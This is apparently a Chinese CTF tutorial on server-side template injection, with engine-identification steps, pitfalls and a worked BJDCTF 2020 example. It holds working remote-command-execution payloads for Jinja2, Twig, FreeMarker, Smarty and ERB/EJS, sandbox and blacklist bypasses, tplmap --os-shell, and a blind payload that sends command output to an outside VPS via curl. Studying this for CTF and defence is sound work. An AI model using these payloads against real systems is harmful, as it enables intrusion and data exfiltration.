# 模板注入 SSTI

关键词：SSTI 模板注入 Jinja2 Twig Freemarker Velocity 服务端模板注入 沙箱逃逸 模板引擎

## ① 识别指纹

- 题干出现 **模板 / template / 渲染 / render / 留言板 / 昵称回显 / 邮件模板 / 导出 PDF** 这类词
- 输入的文字被服务端拼进页面，回显位置就是你输入的位置（不是存进数据库再查出来）
- 参数形如 `?name=` / `?search=` / `?username=`，值里塞模板语法也能原样回来
- 源码里出现 `render_template_string`、`Template().render`、`twig->render`、`FreeMarker`、`Velocity.evaluate`、`smarty->display`
- 响应头 `Server: Werkzeug`，或 Cookie 里 `session=eyJ...`（Flask 签名 session 的 base64 特征）
- 报错栈里出现 `jinja2`、`twig`、`freemarker.core`、`org.apache.velocity` —— 直接确认引擎
- 题目名带 **SSTI / Template / Welcome / Guestbook / Flask / Twig / Render / Calc**
- 提交点与渲染点分离（先存昵称，后台审核页再渲染）—— 存储型 SSTI，别只盯着提交页
- 同一输入在页面上出现两次，一次被转义一次没有 —— 未转义那处才是注入点

## ② 考什么

- 探测语法与引擎的对应：双大括号 / 美元大括号 / ERB 标签 / Ruby 插值 / 单大括号
- Jinja2 与 Twig 的区分（字符串乘法、报错文案、`_self` 是否存在）
- Jinja2 类继承链：`__class__` → `__mro__[1]` → `__subclasses__()` → `__init__.__globals__`
- 常用上下文入口：`config`、`self`、`request`、`lipsum`、`cycler`、`joiner`、`namespace`
- Twig 的 `_self.env` 与 `filter` / `map` 过滤器调用任意函数
- FreeMarker 的 `?new()` 实例化 `Execute`、Smarty 的 `{if}` / `{system}`
- Velocity：`#set` 指令 + `Class.forName` 拿 Runtime，入口依赖上下文里的 `$class`
- 无回显（盲）SSTI：布尔差异、时间延迟、带外回传
- 沙箱（SandboxedEnvironment）与 WAF 黑名单的绕过
- 属性访问替代：`|attr`、`[]`、`request.args` 拼字符串
- 关键字编码：下划线、点、引号被过滤时的十六进制与拼接
- 客户端模板（Vue / Angular）与服务端模板的区分
- 存储型 SSTI 的二次触发与缓存影响

## ③ 判断流程

> 从最便宜的检查开始。先确定引擎，再找 payload；顺序反了会一直打错语法。

1. **圈定反射点**：把参数值改成 `AAAABBBB`，页面原样出现 → 输入进入了响应体，进 2；完全不出现 → 跳 13
2. **打双大括号**：<code v-pre>{{7*7}}</code> 回显 `49` → 模板被执行，进 3；回显原文 → 该引擎不用这个语法，进 4；返回 500 且报语法错 → 也进 4
3. **排除客户端渲染**：查看网页源代码，源码里是 `49` → 服务端执行，进 6；源码里仍是 <code v-pre>{{7*7}}</code> → 是 Vue/Angular 在浏览器里渲染，不是 SSTI，转 XSS，结束
4. **换四族语法**：依次打 `${7*7}`、`<%= 7*7 %>`、`#{7*7}`、`{7*7}`（Smarty 单括号），哪个回显 `49` 进 5；全部原样 → 跳 13
5. **按语法定家族**：`${}` → FreeMarker / Velocity / JSP EL，跳 10；`<%= %>` → ERB / EJS，跳 11；`#{}` → Ruby 插值 / Groovy，跳 11；`{}` → Smarty，跳 10
6. **分 Jinja2 与 Twig**：<code v-pre>{{7*'7'}}</code> 回显 `7777777` → Jinja2，进 7；回显 `49` → Twig，进 9；报错文案里直接写了引擎名 → 按文案分支
7. **Jinja2 探入口**：<code v-pre>{{config}}</code> 回显 `<Config ...>`，或 <code v-pre>{{self}}</code> 有输出 → 上下文可达，进 8；报 `SecurityError` / `is not allowed` → 沙箱，跳 12
8. **Jinja2 类链**：<code v-pre>{{"".__class__.__mro__[1].__subclasses__()}}</code> 输出类列表 → 找 `os._wrap_close` 或 `subprocess.Popen` 的下标 N，替换进 <code v-pre>{{"".__class__.__mro__[1].__subclasses__()[N].__init__.__globals__["os"].popen("id").read()}}</code>；回显 `uid=` → 结束，直接读 `/flag`
9. **Twig 链**：Twig 1/2 用 <code v-pre>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code>；Twig 3 用 <code v-pre>{{["id"]|filter("system")}}</code>；回显命令输出 → 结束
10. **FreeMarker / Smarty**：FreeMarker 用 `${"freemarker.template.utility.Execute"?new()("id")}`；Smarty 用 `{if phpinfo()}{/if}` 探测、`{system("id")}` 执行；回显 → 结束
11. **ERB / EJS / Ruby**：ERB 用 `<%= system("id") %>`，EJS 用 `<%= require("child_process").execSync("id") %>`；回显 → 结束
12. **过滤 / 沙箱绕过**：`config` 被关键字拦 → 用 `|attr` 配合 `request.args` 传属性名（`?a=__class__&b=__mro__&c=__getitem__`）；`config` 直接不可达 → 换 `lipsum`、`cycler`、`joiner`、`namespace`；全部不可达 → 跳 13
13. **换输入点**：Cookie、`User-Agent`、`X-Forwarded-For`、`Referer`、上传文件名、JSON 字段逐个试，每次只改一个；出现回显 → 回 1；全改完仍无 → 跳 14
14. **盲 SSTI**：命令结果看不到 → 用 <code v-pre>{{"a"*10000000}}</code> 看响应是否明显变慢（Jinja2），或用 `popen("curl http://VPS/$(id|base64)")` 带外；收到回调 → 证明执行，改成带外读文件，结束
15. **兜底**：以上都不成立 → 回 1，用 URL 编码后的 payload（`%7B%7B7*7%7D%7D`）再打一遍，并确认不是「包含 + 渲染」两层模板把语法吃掉了

## ④ 工具与命令

```bash
# 一次投五个语法，看哪个回显 49（--data-urlencode 负责编码大括号和空格）
for p in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{7*7}'; do
  echo "== $p"
  curl -s -G 'http://t.cn/' --data-urlencode "name=$p"
done
```

```bash
# Jinja2 与 Twig 二选一：同一条 payload，含义不同
curl -s -G 'http://t.cn/' --data-urlencode "name={{7*'7'}}"
# Jinja2 → 7777777（字符串重复）    Twig → 49（字符串转数字）
```

```bash
# 1) 列出可用的类，存文件
curl -s -G 'http://t.cn/' \
  --data-urlencode 'name={{"".__class__.__mro__[1].__subclasses__()}}' -o classes.txt

# 2) 先编号再过滤，拿到的数字就是 __subclasses__() 的下标（从 0 开始）
grep -o "<class '[^']*'" classes.txt | nl -v0 | \
  grep -E 'os._wrap_close|subprocess.Popen|warnings.catch_warnings'

# 3) 把上一步的下标 N 填进去，执行命令
curl -s -G 'http://t.cn/' --data-urlencode \
  'name={{"".__class__.__mro__[1].__subclasses__()[N].__init__.__globals__["os"].popen("id").read()}}'
```

```jinja
{# Jinja2 常用入口与 RCE 链，按可达性从高到低试 #}
{{ config }}
{{ config.items() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ "".__class__.__mro__[1].__subclasses__() }}

{# 关键字被黑名单时：用 attr + 请求参数拼属性名 #}
{{ ""|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(1) }}
{# ?a=__class__&b=__mro__&c=__getitem__ #}
{{ ""["__cla"+"ss__"] }}
{% print config %}
```

```text
# Twig 1/2
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
# Twig 3
{{["cat /flag"]|filter("system")}}
{{["id"]|map("system")|join(",")}}

# FreeMarker
${"freemarker.template.utility.Execute"?new()("id")}
# Velocity：入口依赖上下文里的 $class，拿到 Class 后走 Runtime.exec
# Smarty
{if phpinfo()}{/if}
{system("id")}
```

```bash
# 盲 SSTI 的两种确认：时间差、带外
# 时间差：响应显著变慢 = 表达式执行
curl -s -G 'http://t.cn/' --data-urlencode 'name={{"a"*10000000}}'
# 带外：VPS 上先起 nc -lvnp 8000，再看是否收到回调
curl -s -G 'http://t.cn/' --data-urlencode \
  'name={{"".__class__.__mro__[1].__subclasses__()[N].__init__.__globals__["os"].popen("curl http://VPS:8000/$(id|base64)").read()}}'
```

```bash
# tplmap 自动识别引擎（Python 2 环境，只对授权目标用）
python2 tplmap.py -u 'http://t.cn/?name=*'
python2 tplmap.py -u 'http://t.cn/?name=*' --os-shell
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| <code v-pre>{{7*7}}</code> 在页面显示 49，但查看源代码是原文 | Vue / Angular 在浏览器里做了插值 | 这是客户端模板，转 XSS 页，不要按 SSTI 打 |
| 双大括号原样返回，就认定没有 SSTI | 引擎只认 `${}`、`<% %>`、`#{}` 或单括号 | 按 ③ 第 4 条换四族语法逐个打 |
| <code v-pre>{{7*7}}</code> 回显 49，<code v-pre>{{config}}</code> 却空白 | 不是 Flask/Jinja2，可能是 Twig | 先做 <code v-pre>{{7*'7'}}</code> 二选一，再决定用哪套链 |
| `__subclasses__()` 报错或为空 | 被沙箱拦截，或对象已被替换 | 换 `lipsum` / `cycler` / `request` 入口，别死磕类链 |
| 有回显但 `popen` 无输出 | 函数被禁用，或命令本身无输出 | 换 `os.listdir('/')`、`open('/flag').read()`，或用带外 |
| 命令里有空格就 500 | 参数被 URL 解析，`+` 变成了空格 | 用 `--data-urlencode`，手工编码时把空格写成 `%20` |
| Cookie 里注入没反应 | 该 Cookie 没有被模板渲染，只是被存了起来 | 找真正渲染它的页面，或改 `User-Agent` 等会进日志/页面的头 |
| 找到 `os` 模块但 `popen` 不存在 | 拿到的是被裁剪过的对象 | 改走 `__builtins__.__import__('os')` 或 `subprocess.Popen` |
| 存储型 SSTI 提交后没触发 | 渲染发生在后台审核页 / 邮件模板 | 等后台访问，或找预览、导出、通知这类二次渲染点 |

## ⑥ 例题

**题目**：`[BJDCTF 2020] Cookie is so stable`
**来源**：BUUCTF 复现平台（原题出自 BJDCTF 2020）
**题干**：一个提交用户名的页面，回显 `Hello <用户名>`；提示是「为什么不再仔细看看 cookie？」。

**关键观察**：用户名被写进 `user` Cookie，再由服务端模板渲染。直接改页面输入框不生效，必须改 Cookie。这是典型的「反射点不在表单，在 Cookie」。

**走了哪条链**：第 1 条（圈定反射点：`user` Cookie）→ 第 2 条（双大括号回显 49）→ 第 3 条（查看源代码确认是服务端渲染）→ 第 6 条（<code v-pre>{{7*'7'}}</code> 回显 49，判定 Twig）→ 第 9 条（Twig 1/2 的 `_self.env` 链）。

**命令与输出**：

```http
GET /flag.php HTTP/1.1
Host: TARGET
Cookie: user={{7*7}}
```

响应里 `Hello` 后面变成 `49`，确认模板执行。再做引擎判定：

```http
Cookie: user={{7*'7'}}
```

回显 `49` 而不是 `7777777`，锁定 Twig。最后打 `_self.env`：

```http
Cookie: user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

`registerUndefinedFilterCallback` 把 `exec` 注册成未定义过滤器的兜底，`getFilter("cat /flag")` 触发它执行命令，页面回显 flag 内容。

**结果**：`cat /flag` 的输出直接出现在响应体里。flag 以原题平台为准。

::: tip flag 说明
本页例题的 flag 随平台和原题版本变化，不在页内固定。练习目标是**先判定引擎、再选链**，不是背 payload。
:::
